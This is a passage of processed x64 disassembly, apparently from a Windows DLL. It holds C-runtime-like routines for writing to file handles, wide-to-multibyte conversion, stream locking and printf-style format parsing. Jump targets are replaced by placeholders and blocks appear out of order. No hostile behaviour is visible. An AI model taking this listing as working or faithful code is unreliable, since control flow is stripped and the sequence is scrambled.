mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r15d 0x2
add rsi 0x2
add rcx 0x2
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
movzx eax [ rbx ]
xor r12d r12d
cmp ax 0xa
mov [ rsp + 0x40 ] ax
sete r12b
add rbx 0x2
mov [ rsp + 0x4c ] r12d
jmp r-xdata
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_18002f310
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x61 ] cl
mov r8d 0x2
mov [ rsp + 0x60 ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x60 ]
jmp r-xdata
mov r15 [ rsp + 0x60 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r15d esi
jg r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
cmp sil 0x1
je r-xdata
mov r12d [ rsp + 0x4c ]
mov r8d 0x1
mov rdx rbx
mov rax r14
sub rax rbx
add rax r13
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x40 ]
call sub_180030aa0
cmp eax 0xffffffff
je r-xdata
mov edi r12d
mov r8d 0xd
sub edi r13d
cmp edi r14d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rbp + rcx + 0x620 ]
mov r8d r15d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x60 ]
lea r9 [ rsp + 0x48 ]
mov rcx [ rax + rcx ]
sub r8d esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x40 ]
call sub_18003102c
cmp ax [ rsp + 0x40 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x5c ]
lea rax [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r12d eax
test eax eax
je r-xdata
mov al [ rbx ]
lea rdx [ rw-data ]
inc edi
mov rcx [ rdx + r12 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rdx + r12 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
lea rcx [ rsp + 0x40 ]
mov r8d 0x2
mov rdx rbx
call sub_180030aa0
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
cmp r15d esi
jg r-xdata
add edi 0x2
test r12d r12d
je r-xdata
mov r12 [ rsp + 0x50 ]
mov rcx [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov rcx [ rax + rcx * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d r12d
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
mov r12d 0xd
mov ecx r12d
mov [ rsp + 0x40 ] r12w
call sub_18003102c
cmp ax [ rsp + 0x40 ]
jne r-xdata
jmp r-xdata
mov edi ebx
sub edi r13d
add edi [ rsp + 0x44 ]
cmp [ rsp + 0x58 ] r12d
jl r-xdata
inc edi
inc [ rsp + 0x44 ]
cmp [ rsp + 0x4c ] 0x0
mov r12 [ rsp + 0x50 ]
je r-xdata
mov eax ebx
sub eax r13d
cmp eax r14d
jae r-xdata
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov [ rsp + 0x60 ] 0xd
mov rcx [ rax + r12 * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d 0x1
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x58 ] 0x1
jl r-xdata
inc [ rsp + 0x44 ]
inc edi
jmp r-xdata
sub_18002eef8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
jmp r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
call sub_180026534
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180030f5c
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_180022de4
mov [ rax ] 0x9
call sub_180022e04
and [ rax ] 0x0
or ebx 0xffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_18002e798
mov ebx eax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_180031004
mov eax ebx
jmp r-xdata
sub_18002efd8
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_180022c10
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_18002f02c
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180022de4
mov [ rax ] 0x9
jmp r-xdata
call sub_180022de4
mov [ rax ] 0x9
call sub_180026534
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x28
retn
sub_18002f094
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_180022c90
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_180022c90
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
dec rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
dec r9
jne r-xdata
sub_18002f19c
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_18002d0a8
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_18002f200
push rbx
sub rsp 0x20
mov rbx rdx
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_18002d0a8
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_18002f234
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
jmp [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
jmp sub_18002cfa8
sub_18002f2c8
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_1800221bc
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18002f310
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_1800221bc
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18002f370
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
test r8 r8
je r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
test rcx rcx
je r-xdata
mov rdx [ rbp + 0x40 ]
lea rcx [ rbp - 0x20 ]
call sub_1800221bc
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] 0x0
jne r-xdata
call sub_180022de4
mov ebx 0x16
mov [ rax ] ebx
call sub_180026534
xor eax eax
jmp r-xdata
and [ rcx ] edx
and [ rbp + 0x28 ] 0x0
mov ecx [ r11 + 0x4 ]
lea rax [ rbp + 0x28 ]
mov [ rsp + 0x38 ] rax
and [ rsp + 0x30 ] 0x0
lea r8 [ rbp + 0x38 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp + 0x38 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rbp + 0x28 ] 0x0
jne r-xdata
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
call sub_180022de4
mov [ rax ] 0x2a
call sub_180022de4
cmp [ rbp - 0x8 ] 0x0
mov eax [ rax ]
je r-xdata
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_180022de4
mov ebx 0x22
mov [ rax ] ebx
call sub_180026534
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test rdi rdi
je r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_180022de4
lea ebx [ rdi + 0x22 ]
mov [ rax ] ebx
call sub_180026534
cmp [ rbp - 0x8 ] dil
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180021150
mov eax ebx
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180021150
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_18002f548
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
dec [ rdx + 0x8 ]
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_180026c74
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_18002f590
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_18002f548
cmp [ rdi ] 0xffffffff
je r-xdata
sub_18002f5e4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx r9
mov rsi r8
mov edi edx
mov rbp rcx
call sub_180022de4
test [ rsi + 0x18 ] 0x40
mov r12d [ rax ]
je r-xdata
call sub_180022de4
and [ rax ] 0x0
jmp r-xdata
cmp [ rsi + 0x10 ] 0x0
jne r-xdata
test edi edi
jg r-xdata
add [ rbx ] edi
jmp r-xdata
mov cl [ rbp ]
mov r8 rbx
mov rdx rsi
dec edi
call sub_18002f548
inc rbp
cmp [ rbx ] 0xffffffff
jne r-xdata
call sub_180022de4
cmp [ rax ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
call sub_180022de4
cmp [ rax ] 0x2a
jne r-xdata
call sub_180022de4
mov [ rax ] r12d
mov r8 rbx
mov rdx rsi
mov cl 0x3f
call sub_18002f548
sub_18002f68c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x68 ] rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r15 r9
mov [ rsp + 0x64 ] eax
mov r13d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x54 ] eax
call sub_1800221bc
xor r10d r10d
test rbx rbx
jne r-xdata
or r14d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
mov rdx [ rsp + 0x68 ]
test rdx rdx
je r-xdata
mov rcx rbx
call sub_18002f2a0
lea rdx [ rw-data ]
cmp eax r14d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ rdx ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x48 ] r10d
mov r8d r10d
mov [ rbp - 0x60 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x50 ]
mov r11d 0x200
cmp eax r14d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x52b20 ]
jmp r-xdata
mov eax esi
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
test r8d r8d
je r-xdata
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
cmp r8d 0x7
jne r-xdata
mov ecx r10d
movsx rax r12b
movzx ecx [ rax + r9 + 0x3df30 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x52b20 ]
mov ecx r8d
test r8d r8d
je r-xdata
movsxd rax ecx
lea rcx [ rax + rax * 8 ]
movsxd rax r8d
add rcx rax
movzx r8d [ rcx + r9 + 0x3df50 ]
shr r8d 0x4
mov [ rsp + 0x60 ] r8d
cmp r8d 0x8
je r-xdata
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x54 ] r10d
call sub_18002f2c8
xor esi esi
test eax eax
je r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18002f548
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18002f548
mov rdx [ rsp + 0x68 ]
mov r12b [ rdx ]
inc rdx
mov [ rsp + 0x68 ] rdx
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r13d r10d
mov edi r14d
mov [ rsp + 0x44 ] r14d
mov [ rsp + 0x54 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x68 ]
mov r8d [ rsp + 0x60 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
cmp [ rbp - 0x68 ] sil
jmp r-xdata
mov r12b [ rdx ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc rdx
mov [ rsp + 0x68 ] rdx
test esi esi
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r15 ]
add r15 0x8
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x58 ] eax
jmp r-xdata
lea ecx [ rdi + rdi * 4 ]
movsx eax r12b
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r15 ]
add r15 0x8
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov edi r14d
mov [ rsp + 0x44 ] r14d
jmp r-xdata
mov al [ rdx ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdx + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdx + 0x1 ] 0x32
jne r-xdata
add rdx 0x2
bts r13d 0xf
jmp r-xdata
cmp [ rdx ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdx 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc rdx
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov rax [ rbp - 0x60 ]
test rax rax
je r-xdata
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test edi edi
jns r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r15 ]
add r15 0x8
jmp r-xdata
bt r13d 0xc
jae r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_18002094c
xor r10d r10d
mov [ rbp - 0x60 ] r10
mov edi [ rsp + 0x4c ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov [ rsp + 0x44 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13b 0x20
je r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov r8 rsi
mov edx edi
call sub_18002f5e4
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_18002f590
test r13b 0x1
je r-xdata
mov [ rsp + 0x50 ] 0x2d
jmp r-xdata
cmp edi r11d
cmovg edi r11d
mov [ rsp + 0x44 ] edi
cmp edi 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r15 ]
mov rcx [ rw-data ]
add r15 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x50 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
mov ecx [ rsp + 0x44 ]
mov rdx rbx
mov [ rsp + 0x20 ] ecx
lea rcx [ rbp - 0x50 ]
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r15 ]
add r15 0x8
call sub_18002f358
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
test r13b 0x40
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x48 ]
xor eax eax
cmp [ rsp + 0x54 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x50 ] 0x2b
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
add edi 0x15d
movsxd rcx edi
call sub_180022c10
mov [ rbp - 0x60 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x44 ] 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
xor eax eax
cmp [ rsp + 0x44 ] eax
jne r-xdata
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
test edi edi
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov r8d [ r15 - 0x8 ]
movsxd r8 [ r15 - 0x8 ]
jmp r-xdata
movzx r8d [ r15 - 0x8 ]
jmp r-xdata
movsx r8 [ r15 - 0x8 ]
jmp r-xdata
mov al [ r15 - 0x8 ]
mov [ rsp + 0x48 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r15 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x48 ]
mov r8 r11
call sub_18002f534
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
call sub_18002f5e4
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_18002f590
mov [ rsp + 0x50 ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x58 ]
mov rsi [ rsp + 0x70 ]
sub r12d [ rsp + 0x48 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov [ rsp + 0x44 ] 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x4c ]
or r13d r11d
jmp r-xdata
mov edi 0x10
bts r13d 0xf
cmp eax 0x73
je r-xdata
and r13d 0xfffffff7
cmp edi r11d
cmovg edi r11d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x60 ] r10d
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_180023ce0
mov esi [ rsp + 0x40 ]
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x50 ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x51 ] al
jmp r-xdata
mov rbx [ r15 ]
cmp edi r14d
mov eax edi
mov ecx 0x7fffffff
cmove eax ecx
add r15 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x64 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
mov edx r12d
mov cl 0x20
call sub_18002f590
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov esi r14d
mov [ rsp + 0x40 ] r14d
jmp r-xdata
mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
jne r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x54 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x44 ] edi
